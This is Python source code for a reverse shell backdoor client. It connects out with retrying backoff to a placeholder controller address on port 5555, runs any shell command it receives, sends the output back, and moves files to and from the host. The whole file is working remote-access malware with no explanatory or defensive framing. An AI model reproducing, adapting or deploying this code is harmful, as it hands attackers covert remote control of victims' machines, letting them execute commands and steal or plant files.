import socket
import time
import json
import subprocess
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(1)
        while True:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        s.settimeout(None)

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command.startswith('cd '):
            os.chdir(command[3:])
        elif command.startswith('download '):
            upload_file(command[9:])
        elif command.startswith('upload '):
            download_file(command[7:])
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = process.stdout.read() + process.stderr.read()
            reliable_send(result.decode())

def connection():
    backoff_time = 5 
    while True:
        time.sleep(backoff_time)
        try:
            s.connect(('Host-IP', 5555))  # Replace with actual server IP
            shell()
            s.close()
            break
        except:
            backoff_time = min(backoff_time * 2, 60)  

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
